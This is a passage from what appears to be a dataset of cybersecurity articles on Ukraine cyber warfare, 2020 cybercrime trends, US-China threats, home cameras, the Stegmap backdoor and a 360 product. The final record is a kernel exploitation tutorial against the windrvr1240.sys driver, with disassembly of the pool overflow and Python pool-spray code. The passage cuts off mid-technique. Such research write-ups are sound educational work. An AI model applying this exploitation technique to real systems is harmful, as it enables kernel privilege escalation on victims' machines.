and having unplanned and far-reaching impacts on global supply chains. Within a day of Ukraine being attacked by cyber warfare, the US CISA issued a national security warning, warning US organizations not to be affected by ransomware and related supply chain attacks. Vigilant and advanced cybersecurity defense awareness. Spear phishing attacks with increased firepower According to the global vision of 360 Security Brain, starting from the end of 2021, a large number of Ukrainian users have been attacked by malicious document spear phishing from suspected APT organizations. The attackers use decoy documents to release and execute vbs scripts, and complete malicious documents by creating scheduled tasks. Most of these vbs file names end with .log and are highly obfuscated. The size and activity of affected users of the related attack surged and peaked on February 21 this year: We have counted the main regions of Ukraine’s victimized users this year, and the data shows that most of the victimized users are from the Donetsk and Kyiv regions: Vulnerability utilization Through the analysis of the cyberspace asset mapping data of 360 Security Center, the Ukrainian government website has used a website building program called “octobercms” on a large scale. Ukrainian authorities have noted that a vulnerability CVE-2021-32648 in the OctoberCMS content management system (CMS) platform has been widely exploited, allowing attackers to directly gain administrator privileges on a website. In addition, there are also some log4j exploits that have been officially noticed. According to the analysis of public vulnerability information, the CVE-2021-32648 vulnerability is a password reset function verification bypass vulnerability. Verify on. According to the code logic in User.php, the process of resetting the password in octobercms is divided into the following steps: Trigger the reset process, and call getResetPasswordCode for the user who needs to reset the password to generate a random string with a default length of 42. Verify the password reset request through attemptResetPassword, only verify the random string generated in the previous step, and the verification function is checkResetPasswordCode. There is a PHP weak type error in the checkResetPasswordCode function, which makes it possible to bypass the verification of checkResetPasswordCode without knowing the specific content of the random characters. Directly overwrite the old password of the corresponding user with the new password and save the data. Summary Based on the analysis and deduction of key technical details, 360 Advanced Threat Research Institute believes that this attack is a major and destructive cyber warfare attack against Ukraine. Combined with the global vision of 360 Security Center, most of the attack can be deduced The process and key details of this cyber attack are still evolving, and it is very likely that organizations outside Ukraine will be affected. Relevant organizations need to be vigilant. In the digital age, cyber warfare will become the first choice. Cyber warfare attacks are not only for the purpose of stealing intelligence, but can also cause damage to infrastructures such as transportation, energy, and finance. Any node may become a springboard for attacks, which can lead to serious consequences. For this reason, we must be aware of the network The severe situation of the war, face up to the network war! Behind the “disconnection” caused by the cyber attack in Ukraine this time, it is undoubtedly not revealed that the new type of cyber warfare already has physical attack capabilities. That is to say, a network attack has the ability to turn the blow of the traditional virtual world into the actual damage of the physical world. The attack speed is fast and the effect is strong, but the cost, movement and controllability are much better. The characteristics of the new type of cyber warfare can be summarized as “seven majors”, that is, the battlefield is big, the opponent is big, the means is big, the challenge is big, the goal is big and the harm is big. In the future, cyber warfare will become the biggest threat in the digital age. In addition, judging from the Ukrainian Ministry of Defense’s call to help defend against possible cyber attacks on Ukrainian critical infrastructure, cyber warfare targeting urban infrastructure will become more frequent in the future. The interconnection of all things in digital cities, the increase in the number of intelligent terminals and network users, the wide range of data sources, the diversification of data, and the complexity of data structures make it difficult to maintain various key information infrastructures that carry urban operation data, resulting in the construction of network security and operational risk. At the same time, the vulnerabilities of various software and hardware systems of critical information infrastructure are also difficult to avoid being exploited and attacked. Therefore, it is necessary to strengthen the top-level design and overall plan of cyber warfare defense for digital cities, build a combat-oriented defense system and an emergency response system, and make every effort to ensure the security of digital cities. More notably, the swift warnings issued by the U.S., large and small, ensure that senior leaders in every organization are aware of critical cyber risks and take urgent steps to deal with them. If working with Ukrainian organizations, pay extra attention to monitoring, inspecting, and quarantining traffic from these organizations; closely scrutinize access controls for these traffic. Learn more about 360 Total Security"
3cfb2eb3-fa8d-5626-bcdc-470d58cd1b5b,08-February-2021,"Top 9 cybercrime tactics, techniques and trends in 2020: A recap",Cybercrime losses cost the globe more than $1 trillion last year. Europol says ransomware attacks were the top cyber threat for law enforcement in 2020. The rise of specific phishing strategies linked to the pandemic and COVID-19 topped the list.,"2020 was a busy year for cybercriminals, with new opportunities brought on by the COVID-19 lockdowns and digital transformation initiatives. According to McAfee’s “The Hidden Costs of Cybercrime” report, losses from cybercriminal activity cost the globe more than $1 trillion last year. Attacks specifically aimed at exploiting the regulations around the pandemic increased drastically, but companies also experienced social engineering, ransomware and other types of cybercrime. What were the top cybercrime techniques and trends of 2020? As per the seventh annual Internet Organized Cyber Threat Assessment (IOCTA) report from Europol’s European Cybercrime Center, ransomware attacks were the top cyber threat for law enforcement agencies. Additionally, adversaries used techniques like business email compromise and cryptocurrency abuse to exploit their targets. Here’s a recap of the top cybercrime techniques and trends that surfaced last year. 1. COVID-19 specific phishing Cybercriminals took advantage of topical trends and fears in the wider marketplace to access sensitive details. When COVID-19 hit , the rise of phishing strategies specifically linked to the pandemic surged. Criminals began twisting existing forms of cybercrime to suit the narrative of the pandemic. In the UK, older people began receiving emails and phone calls offering them a vaccine for the ailment in exchange for information. Malicious individuals may use coronavirus-themed emails in a variety of ways to generate results. Common examples include health advice emails that ask customers to click on a link and workplace policy emails for remote employees. 2. Ransomware Ransomware isn’t a new concept, but it remains the most dominant threat as criminals continue to increase pressure on companies that need to protect their reputation. Attacks are becoming increasingly more targeted, and it seems that no company is safe. Victims of 11 of the largest ransomware attacks spent over $144.2 million in response to the attack in 2020. In August of 2020, North American land developer and homebuilder Brookfield was hit by a cybercriminal group named Darkside, who demanded payment for data downloaded from the business about administration, finances, commercial insights, payroll, and more. With the personal details of 151,000 employees at risk, the business was forced to pay out to protect its staff’s privacy. 3. Business Email Compromise Business Email Compromise (BEC) attacks are continuing to rise as more people work digitally. As countless companies shift into the remote working environment, teams are spending more time in their email inboxes, dealing with information that they may not be used to seeing. A business email compromise attack could involve a criminal accessing a business email account to send money requests to a financial department. Alternatively, criminals could use the same spoofed accounts to request sensitive information or data that could later allow for a ransomware attack. 4. Distributed Denial-of-Service attacks Though the number of DDoS attacks, in general, has begun to decline, some individual attacks continued to make headlines in 2020. DDoS attacks prevent employees and business leaders from accessing the tools they need to operate, from email addresses to websites. In 2020, the Amazon Web Services DDoS attack was potentially the largest in the industry. The company was hit by a giant attack in February, using rapid-fire technology to overwhelm a set of cloud servers. The attack lasted for three days in total and peaked at a level of around 2.3 terabytes per second, causing massive disruption to the cloud solution. 5. DeFi cryptocurrency hack DeFi attacks exploded in volume during 2020. According to the most recent reports, there were around 15 hacks of DeFi (cryptocurrency) platforms last year, which amounted to around $120 million in stolen funds. Cryptocurrencies hold particular appeal for cybercriminals as they allow for anonymous payments on various platforms. The DeFi attack that generated the worst outcomes was the Lendf.me attack, which cost around $25 million in lost funding. A re-entrancy vector allowed the adversaries to interact with token contracts as though they had much collateral and steal the platform’s assets. 6. Credential stuffing Credential stuffing is another common example of a cybersecurity threat that continued to grow during 2020. This cyberattack tactic involves testing millions of email and password combinations on different sites, hoping that the details that work for one website may work for another. The pandemic-driven movement to more digital platforms sparked a massive rise in digital fraud activities. Since many of today’s remote working employees reuse passwords on multiple platforms, the opportunity to steal business credentials is enormous. Last year, video-conferencing company Zoom fell victim to this attack, with 500,000 usernames and passwords distributed on the dark web. 7. Smishing attacks Smishing is a relatively new concept in the cybercrime landscape, but it’s one that’s gaining attention fast. The tactic involves sending fraudulent text messages to customers, often emulating banks or other official companies to get personal details. Similar to phishing, smishing executors hope that the act of sending a text will generate less suspicion in customers, leading to more successful attacks. Customers don’t have the same skepticism about text messages as they do for email messages yet. Additionally, it’s often difficult for banks to protect customers against smishing attacks because many criminals abuse the alpha tag SMS thread and signaling vulnerabilities. 8. Modular malware Most companies have already heard of malware, and they work hard to protect themselves from it with various forms of cyber protection. However, law enforcement agencies in 2020 became increasingly concerned about the extent to which crime gangs would combine modular segments of malicious code to form bigger attacks. Criminals appeared to be working together more frequently in 2020. There was a lot of subcontracting and cooperation among threat actors, which led to an increase in opportunity for thieves. If criminals continue to work together in the years ahead, it may become increasingly difficult to fight back. 9. Shoulder surfing Now that employees are spending more time outside of the office, they’re becoming increasingly comfortable with using their workplace credentials on various devices. This could mean that aside from logging into platforms in their home office, employees are also dealing with work requests on their smartphones when they’re out shopping or logging into tablets from coffee shops and shared spaces. A rise in “anywhere” work could open the door for more vulnerable employees who forget to protect themselves against the people that could easily be looking over their shoulders. Shoulder-surfing may be a low-tech form of cybercrime, but it’s still a dangerous one, and hackers can even carry it out over videoconferencing. Conclusion 2020 is finally over, but the criminals that emerged throughout the year are still going strong. The cybercrime trends and techniques that emerged last year will influence the security issues that we continue to face in the years ahead. Now’s the time for all organizations to reconsider their security strategy and ensure that they have solutions to stay ahead of the curve. Sources Internet Organised Crime Threat Assessment (iOCTA) , Europol The Hidden Costs of Cybercrime , McAfee The 11 Biggest Ransomware Attacks Of 2020 (So Far) , CRN Hackers stole $120 million via 15 DeFi hacks in 2020 , The Block Dan Virgillito is a blogger and content strategist with experience in cyber security, social media and tech news. Visit his website or say hi on Twitter."
4049855d-7a86-5ee2-bed9-b1ef1d890ef1,02-August-2022,Cyber Threats from US – China Tensions,Increased political tensions between the U.S. and the People's Republic of China are expected to result in cyber-attacks. eSentire believes Chinese state-affiliated threat actors will target government and private interests. Chinese state affiliated groups are known to exploit known vulnerabilities and zero-day vulnerabilities.,"Increasing political tensions between the United States and the People’s Republic of China (PRC) is expected to result in future cyber-attacks targeting American state and private interests. On August 2 nd , 2022, the speaker of the United States House of Representatives arrived in the country of Taiwan, an island nation that China recognizes as part of the PRC, for a diplomatic mission. Chinese government officials had previously stated that there would be serious consequences if the visit occurred. The eSentire Threat Intelligence team assesses with high confidence that Chinese state-affiliated threat actors will respond to this event with cyberattacks targeting both government and private organizations in the United States and allied countries. As of this writing, Reuters is reporting that China's defense ministry stated it ‘will launch ""targeted military operations"" in response to U.S. House Speaker Pelosi's visit to Taiwan’. In June 2022CISA, in coordination with the FBI and NSA, released a report on PRC threat actors exploiting network providers and devices. The full report includes vulnerabilities known to be targeted by PRC threat actors as well as recommended mitigations that should be referred to. Recent cyberactivity attributed to Chinese state-affiliated APT groups includes campaigns attributed to Aoqin Dragon , campaigns targeting a Sophos zero-day vulnerability, Deep Panda targeting VMware Horizon servers, and APT10 targeting organizations in the finance industry. eSentire security teams are actively tracking information on recent Chinese APT activity, and threat hunts for eSentire clients are performed based on publicly available information. Cyberattacks stemming from the increased US-China relations are most likely to impact government organizations and critical infrastructure. Private businesses may be targeted for information theft or disruptive attacks out of retribution. There is the additional risk of targeting by hacktivist groups that operate outside of the PRC but support the regime. The eSentire Threat Intelligence team assesses with medium confidence that these attacks would be less sophisticated, such as defacements or Distributed Denial of Service (DDoS) attacks. Chinese state affiliated groups are known to employ a wide variety of tactics. APT groups have been identified exploiting both known vulnerabilities and zero-day vulnerabilities. Additionally, these groups use both custom malware and commodity malware that may be purchased on darkweb forums. The eSentire Threat Intelligence team will continue monitoring the situation for additional details and updates as they become available. [1] https://www.reuters.com/world/china-launch-targeted-military-operations-due-pelosi-visit-2022-08-02/ [2] https://www.cisa.gov/uscert/ncas/alerts/aa22-158a [3] https://nvd.nist.gov/vuln/detail/CVE-2021-44228 [4] https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/ [5] https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/ [6] https://www.fortinet.com/blog/threat-research/deep-panda-log4shell-fire-chili-rootkits [7] https://medium.com/cycraft/china-implicated-in-prolonged-supply-chain-attack-targeting-taiwan-financial-sector-264b6a1c3525"
161db055-ad67-5640-b603-1320c7f38364,03-October-2022,8 questions to ask yourself before getting a home security camera,Home security cameras can pose a security and privacy risk to the household. Not all vendors have a good track record of building reliable products with strong security. Research the brand and reputation of the vendors before buying a home security camera.,"As each new smart home device may pose a privacy and security risk, do you know what to look out for before inviting a security camera into your home? Security cameras were once the preserve of the rich and famous. Now anyone can get their hands on one thanks to technological advances. The advent of the Internet of Things (IoT) has created a major new market – for manufacturers of devices like connected doorbells and baby monitors, and more sophisticated whole-of-property systems. Connected to home Wi-Fi networks, these devices allow owners to watch live video footage, record video for later and receive alerts when out of the house. Yet these same features can also expose households to new risks if the camera is compromised and/or the footage is leaked. Not all vendors have as big a focus on security and privacy as they should. That means you need to ask the right questions before starting. Here are some examples: First up, it’s time to decide if a home security camera is really necessary or if you’re only interested in getting one because everyone else seems to. Part of this decision-making process may be working out what type of set-up to get: whether you need a full CCTV system requiring professional installation, or a cheaper connected camera that can be up-and-running quickly and is controlled via a smartphone app. This is critical. While home security cameras are meant to protect the household, getting one might, in fact, unwittingly put the household at greater risk. In a worst-case scenario, remote or local hackers could access live feeds to spy on family members or case out the property to see if it’s empty. Both scenarios can be unnerving, especially as you would have little warning that this was happening. One way hackers could gain access to these feeds involves accessing the home wireless network, perhaps by guessing or brute-forcing the Wi-Fi password. A more likely scenario, however, is an attack in which they guess or crack your account passwords or exploit an unpatched firmware vulnerability . READ ALSO: D‑Link camera vulnerability allows attackers to tap into the video stream With so many models on the market, it pays to research what’s on offer, and the reputation of different vendors. If you’re serious about security, you’ll want a reputable brand with a strong track record on building reliable products with good consumer ratings for security and privacy. Things like prompt patching, strong encryption, enhanced log-in security and watertight privacy policies are important. And if engineers are required to fit a system, how much access are they granted? One US home security technician was able to spy on hundreds of homes over a four-and-a-half year period after adding his email on set-up. Another potential element of risk is related to the vendor itself. Do you know if the video data is stored on-site or in the provider’s cloud datacenter? In its latest transparency report, Amazon-owned Ring claimed to have turned over an unprecedented volume of its customers’ footage to the US authorities last year, including some cases without the consent of the device’s owner. Many camera owners may feel uncomfortable about such policies. Once you’re aware of the major security and privacy risks involved, it’s worth familiarizing yourself with what’s needed to ensure these devices run safely. Default passwords should always be changed to something strong and unique. For added safety, use two-factor authentication whenever it’s available. Also, devices should be regularly updated to the latest firmware. Choose a reputable vendor with a track record of manufacturing properly secured devices and shipping firmware updates. Switching off remote viewing of video footage will offer an added peace of mind and minimize the chances of a hacker accessing it. It’s not all about the settings on the camera itself. Your home router is the gateway to the smart home and could be a source of security risk if not properly configured. UPnP and port forwarding functions, which allow devices to find others on the same network, could be hijacked by hackers to access smart cameras. That’s why they should be switched off on the router, although it might prevent some applications and devices from working. READ ALSO: Privacy by Design: Can you create a safe smart home? As mentioned, it can be difficult to spot if a security camera has been hijacked. Two of the things to look out for would be abnormal movements of the camera or strange voices or sounds coming from it. If suddenly you can’t log in because the password to your account has changed, then that clearly isn’t a good sign either. Another possible avenue to consider is increased data usage or poor performance. If the device is being accessed by an unauthorized user, your camera may run slower because of limited memory and CPU power. This isn’t a fool-proof check though – it may also be the result of something more mundane like a poor internet connection. Getting a home security camera is not just about your own security and privacy. It could also impact the rights of your neighbors, if a camera captures images of people outside the boundary of your property. Under the GDPR, these individuals also have privacy rights that must be respected. It’s a good idea to position cameras so as to minimize any intrusion, and to be as transparent as possible with neighbors. The UK government has a good guide here. There’s plenty to consider before buying a home security system. And like any purchase, the more up-front research you can do on it, the better. BEFORE YOU GO: These things may be cool, but are they safe?"
e5239895-59b3-5355-ad5b-e77afe64e061,30-September-2022,Cyber Attacks Against Middle East Governments Hide Malware in Windows Logo,"Symantec says a threat actor has been using a steganographic trick to conceal a backdoor in a Windows logo. The group targeted Middle Eastern governments with the tooling, according to researchers. The malware was hidden in an image of an old Windows logo hosted on a GitHub repository.","An espionage-focused threat actor has been observed using a steganographic trick to conceal a previously undocumented backdoor in a Windows logo in its attacks against Middle Eastern governments. Broadcom's Symantec Threat Hunter Team attributed the updated tooling to a hacking group it tracks under the name Witchetty , which is also known as LookingFrog , a subgroup operating under the TA410 umbrella. Intrusions involving TA410 – which is believed to share connections with a Chinese threat group known as APT10 (aka Cicada, Stone Panda, or TA429) – primarily feature a modular implant called LookBack. Symantec's latest analysis of attacks between February and September 2022, during which the group targeted the governments of two Middle Eastern countries and the stock exchange of an African nation, highlights the use of another backdoor dubbed Stegmap. The new malware leverages steganography – a technique used to embed a message (in this case, malware) in a non-secret document – to extract malicious code from a bitmap image of an old Microsoft Windows logo hosted on a GitHub repository. ""Disguising the payload in this fashion allowed the attackers to host it on a free, trusted service,"" the researchers said . ""Downloads from trusted hosts such as GitHub are far less likely to raise red flags than downloads from an attacker-controlled command-and-control (C&C) server."" Stegmap, like any other backdoor, has an extensive array of features that allows it to carry out file manipulation operations, download and run executables, terminate processes, and make Windows Registry modifications. Attacks that lead to the deployment of Stegmap weaponize ProxyLogon and ProxyShell vulnerabilities in Exchange Server to drop the China Chopper web shell, that's then used to carry out credential theft and lateral movement activities, before launching the LookBack malware. A timeline of an intrusion on a government agency in the Middle East reveals Witchetty maintaining remote access for as long as six months and mounting a wide range of post-exploitation efforts, including network enumeration and installing custom malware, until September 1, 2022. ""Witchetty has demonstrated the ability to continually refine and refresh its toolset in order to compromise targets of interest,"" the researchers said. ""Exploitation of vulnerabilities on public-facing servers provides it with a route into organizations, while custom tools paired with adept use of living-off-the-land tactics allow it to maintain a long-term, persistent presence in targeted organizations."""
c14899ef-c9e4-54e9-8223-eec96ac3b6a5,22-August-2022,"Data Shield, Creating a Copper Wall for Privacy Protection",360 Total Security has newly launched the “Data Shield” function to protect users' privacy and personal information. The function provides users with 7*24H all-day in-depth defense with leading security technology. 360 Total Security Data Shield mainly escorts user data security from Privacy File Protection.,"Learn more about 360 Total Security With the advent of digital era, there are inevitably many more “eyes” around us, and even every move is under real-time “monitoring”. For example, social platforms may use our photos for deep learning, hack home cameras after cracking IP addresses to steal videos… Privacy and personal information protection have become topics of widespread public concern. Therefore, 360 Total Security has newly launched the “Data Shield” function, which can provide users with 7*24H all-day in-depth defense with leading security technology, so that users can surf the Internet with peace of mind and privacy. As a newly launched function, “Data Shield” mainly escorts user data security from Privacy File Protection. Privacy File Protection, as the name suggests, prevents private files from being read. Once irrelevant software accesses private information such as social software chat records, addresses where account passwords are stored, browsing records, etc., the system will issue a reminder at the first time, asking whether it needs to be intercepted. At the same time, users can also add rules by themselves to add important privacy files or directories to the protection list, so as to remind and block when irrelevant software access. In addition, users can also manage the permissions of applications to access private files in the Trusted List and Blocked List, so that they can obtain enough controllable space while ensuring privacy and security. 360 Total Security Data Shield is simple to operate but powerful. Users only need to upgrade to premium membership to immediately open the protection, enjoy five layers of privacy protection, and protect personal privacy information from being leaked. Learn more about 360 Total Security"
8e44a024-7355-5bb2-be6b-a71a4598d980,06-September-2017,Sharks in the Pool :: Mixed Object Exploitation in the Windows Kernel Pool,A basic way to exploit a windows kernel pool overflow vulnerability. Exploit by overwriting the TypeIndex after spraying the kernel pool with a mix of kernel objects.,"In the past I have spent a lot of time researching web related vulnerabilities and exploitation and whilst I’m relatively versed in usermode exploitation, I needed to get up to speed on windows kernel exploitation. To many times I have tested targets that have kernel device drivers that I have not targeted due to the sheer lack of knowledge. Gaining low privileged code execution is fun, but gaining ring 0 is better! TL;DR; I explain a basic kernel pool overflow vulnerability and how you can exploit it by overwriting the TypeIndex after spraying the kernel pool with a mix of kernel objects. Introduction After reviewing some online kernel tutorials I really wanted to find and exploit a few kernel vulnerabilities of my own. Whilst I think the HackSys Extreme Vulnerable Driver (HEVD) is a great learning tool, for me, it doesn’t work. I have always enjoyed finding and exploiting vulnerabilities in real applications as they present a hurdle that is often not so obvious. Recently I have been very slowly (methodically, almost insanely) developing a windows kernel device driver fuzzer. Using this private fuzzer (eta wen publik jelbrek?), I found the vulnerability presented in this post. The technique demonstrated for exploitation is nothing new, but it’s slight variation allows an attacker to basically exploit any pool size. This blog post is mostly a reference for myself , but hopefully it benefits someone else attempting pool exploitation for the first time. The vulnerability After testing a few SCADA products, I came across a third party component called “WinDriver”. After a short investigation I realized this is Jungo’s DriverWizard WinDriver . This product is bundled and shipped in several SCADA applications, often with an old version too. After installation, it installs a device driver named windrvr1240.sys to the standard windows driver folder. With some basic reverse engineering, I found several ioctl codes that I plugged directly into my fuzzers config file. { ""ioctls_range"" :{ ""start"" : ""0x95380000"" , ""end"" : ""0x9538ffff"" } } Then, I enabled special pool using verifier /volatile /flags 0x1 /adddriver windrvr1240.sys and run my fuzzer for a little bit. Eventually finding several exploitable vulnerabilities, in particular this one stood out: kd> .trap 0xffffffffc800f96c ErrCode = 00000002 eax=e4e4e4e4 ebx=8df44ba8 ecx=8df45004 edx=805d2141 esi=f268d599 edi=00000088 eip=9ffbc9e5 esp=c800f9e0 ebp=c800f9ec iopl=0 nv up ei pl nz na pe cy cs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010207 windrvr1240+0x199e5: 9ffbc9e5 8941fc mov dword ptr [ecx-4],eax ds:0023:8df45000=???????? kd> dd esi+ecx-4 805d2599 e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4 805d25a9 e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4 805d25b9 e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4 805d25c9 e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4 805d25d9 e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4 805d25e9 e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4 805d25f9 e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4 805d2609 e4e4e4e4 e4e4e4e4 e4e4e4e4 e4e4e4e4 That’s user controlled data stored in [esi+ecx] and it’s writing out-of-bounds of a kernel pool. Nice. On closer inspection, I noticed that this is actually a pool overflow triggered via an inline copy operation at loc_4199D8. .text:0041998E sub_41998E proc near ; CODE XREF: sub_419B7C+3B2 .text:0041998E .text:0041998E arg_0 = dword ptr 8 .text:0041998E arg_4 = dword ptr 0Ch .text:0041998E .text:0041998E push ebp .text:0041998F mov ebp, esp .text:00419991 push ebx .text:00419992 mov ebx, [ebp+arg_4] .text:00419995 push esi .text:00419996 push edi .text:00419997 push 458h ; fized size_t +0x8 == 0x460 .text:0041999C xor edi, edi .text:0041999E push edi ; int .text:0041999F push ebx ; void * .text:004199A0 call memset ; memset our buffer before the overflow .text:004199A5 mov edx, [ebp+arg_0] ; this is the SystemBuffer .text:004199A8 add esp, 0Ch .text:004199AB mov eax, [edx] .text:004199AD mov [ebx], eax .text:004199AF mov eax, [edx+4] .text:004199B2 mov [ebx+4], eax .text:004199B5 mov eax, [edx+8] .text:004199B8 mov [ebx+8], eax .text:004199BB mov eax, [edx+10h] .text:004199BE mov [ebx+10h], eax .text:004199C1 mov eax, [edx+14h] .text:004199C4 mov [ebx+14h], eax .text:004199C7 mov eax, [edx+18h] ; read our controlled size from SystemBuffer .text:004199CA mov [ebx+18h], eax ; store it in the new kernel buffer .text:004199CD test eax, eax .text:004199CF jz short loc_4199ED .text:004199D1 mov esi, edx .text:004199D3 lea ecx, [ebx+1Ch] ; index offset for the first write .text:004199D6 sub esi, ebx .text:004199D8 .text:004199D8 loc_4199D8: ; CODE XREF: sub_41998E+5D .text:004199D8 mov eax, [esi+ecx] ; load the first write value from the buffer .text:004199DB inc edi ; copy loop index .text:004199DC mov [ecx], eax ; first dword write .text:004199DE lea ecx, [ecx+8] ; set the index into our overflown buffer .text:004199E1 mov eax, [esi+ecx-4] ; load the second write value from the buffer .text:004199E5 mov [ecx-4], eax ; second dword write .text:004199E8 cmp edi, [ebx+18h] ; compare against our controlled size .text:004199EB jb short loc_4199D8 ; jump back into loop The copy loop actually copies 8 bytes for every iteration (a qword) and overflows a buffer of size 0x460 (0x458 + 0x8 byte header). The size of copy is directly attacker controlled from the input buffer (yep you read that right). No integer overflow, no stored in some obscure place, nada. We can see at 0x004199E8 that the size is attacker controlled from the +0x18 offset of the supplied buffer. Too easy! Exploitation Now comes the fun bit. A generic technique that can be used is the object TypeIndex overwrite which has been blogged on numerous occasions (see references) and is at least 6 years old, so I won’t go into too much detail. Basically the tl;dr; is that using any kernel object, you can overwrite the TypeIndex stored in the _OBJECT_HEADER. Some common objects that have been used in the past are the Event object (size 0x40) and the IoCompletionReserve object (size 0x60). Typical exploitation goes like this: Spray the pool with an object of size X, filling pages of memory. Make holes in the pages by freeing/releasing adjacent objects, triggering coalescing to match the target chunk size (in our case 0x460). Allocate and overflow the buffer, hopefully landing into a hole, smashing the next object’s _OBJECT_HEADER, thus, pwning the TypeIndex. For example, say if your overflowed buffer is size 0x200, you could allocate a whole bunch of Event objects, free 0x8 of them (0x40 * 0x8 == 0x200) and voilà, you have your hole where you can allocate and overflow. So, assuming that, we need a kernel object that is modulus with our pool size. The problem is, that doesn’t work with some sizes. For example our pool size is 0x460, so if we do: >>> 0x460 % 0x40 32 >>> 0x460 % 0x60 64 >>> We always have a remainder. This means we cannot craft a hole that will neatly fit our chunk, or can we? There are a few ways to solve it. One way was to search for a kernel object that is modulus with our target buffer size. I spent a little time doing this and found two other kernel objects: # 1 type = ""Job"" size = 0x168 windll . kernel32 . CreateJobObjectW ( None , None ) # 2 type = ""Timer"" size = 0xc8 windll . kernel32 . CreateWaitableTimerW ( None , 0 , None ) However, those sizes were no use as they are not modulus with 0x460. After some time testing/playing around, I relized that we can do this: >>> 0x460 % 0xa0 0 >>> Great! So 0xa0 can be divided evenly into 0x460, but how do we get kernel objects of size 0xa0? As it turns out, we combine the Event and the IoCompletionReserve objects (0x40 + 0x60 = 0xa0). The Spray def we_can_spray (): """""" Spray the Kernel Pool with IoCompletionReserve and Event Objects. The IoCompletionReserve object is 0x60 and Event object is 0x40 bytes in length. These are allocated from the Nonpaged kernel pool. """""" handles = [] IO_COMPLETION_OBJECT = 1 for i in range ( 0 , 25000 ): handles . append ( windll . kernel32 . CreateEventA ( 0 , 0 , 0 , 0 )) hHandle = HANDLE ( 0 ) handles . append ( ntdll . NtAllocateReserveObject ( byref ( hHandle ), 0x0 , IO_COMPLETION_OBJECT )) # could do with some better validation if len ( handles ) > 0 : return True return False This function sprays 50,000 objects. 25,000 Event objects and 25,000 IoCompletionReserve objects. This looks quite pretty in windbg: kd> !pool 85d1f000 Pool page 85d1f000 region is Nonpaged pool *85d1f000 size: 60 previous size: 0 (Allocated) *IoCo (Protected) Owning component : Unknown (update pooltag.txt) 85d1f060 size: 60 previous size: 60 (Allocated) IoCo (Protected) <--- chunk first allocated in the page 85d1f0c0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f100 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f160 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f1a0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f200 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f240 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f2a0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f2e0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f340 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f380 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f3e0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f420 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f480 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f4c0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f520 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f560 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f5c0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f600 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f660 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f6a0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f700 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f740 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f7a0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f7e0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f840 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f880 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f8e0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f920 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1f980 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1f9c0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fa20 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fa60 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fac0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fb00 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fb60 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fba0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fc00 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fc40 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fca0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fce0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fd40 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fd80 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fde0 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fe20 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1fe80 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1fec0 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1ff20 size: 40 previous size: 60 (Allocated) Even (Protected) 85d1ff60 size: 60 previous size: 40 (Allocated) IoCo (Protected) 85d1ffc0 size: 40 previous size: 60 (Allocated) Even (Protected) Creating Holes The ‘IoCo’ tag is representative of a IoCompletionReserve object and a ‘Even’ tag is representative of an Event object. Notice that our first chunks offset is 0x60, thats the offset we will start freeing from. So if we free groups of objects, that is, the IoCompletionReserve and the Event our calculation becomes: >>> ""0x%x"" % ( 0x7 * 0xa0 ) '0x460' >>> We will end up with the correct size. Let’s take a quick look at what it looks like if we free the next 7 IoCompletionReserve object’s only. kd> !pool 85d1f000 Pool page 85d1f000 region is Nonpaged pool *85d1f000 size: 60 previous size: 0 (Allocated) *IoCo (Protected) Owning component : Unknown (update pooltag.txt) 85d1f060 size: 60 previous size: 60 (Free) 